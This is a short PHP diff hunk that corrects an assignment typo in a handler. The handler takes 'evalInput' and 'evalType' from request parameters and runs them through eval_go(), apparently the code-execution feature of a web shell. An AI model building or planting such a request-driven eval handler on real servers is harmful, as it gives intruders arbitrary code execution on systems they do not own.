@@ -426,7 +426,7 @@ elseif(isset($p['evalInput']) && isset($p['evalType'])){
 	@ini_set('display_startup_errors','1');
 
 	$res = eval_go($evalType, $evalInput, $evalOptions, $evalArguments);
-	if($res===false) $res == "error";
+	if($res===false) $res = "error";
 	output(html_safe($res));
 }
 elseif(isset($p['evalGetSupported'])){
